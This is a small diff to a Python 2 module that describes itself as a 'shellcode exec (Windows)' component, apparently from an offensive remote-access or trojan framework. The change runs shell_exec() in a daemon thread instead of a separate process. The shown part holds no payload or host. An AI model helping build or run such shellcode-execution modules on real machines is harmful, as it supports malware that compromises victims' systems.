@@ -22,12 +22,13 @@ def shell_exec():
 
 
 def run(**args):
-    import multiprocessing as mp
+    import threading
     print "[*] In shellcode exec (Windows) module."
     #####
     try:
-        freeze_support()
-        Process(target=shell_exec).start()
+        thread = threading.Thread(target=shell_exec)
+        thread.daemon = True                            # Daemonize thread
+        thread.start() # Start the execution
 
         
     except Exception as e:
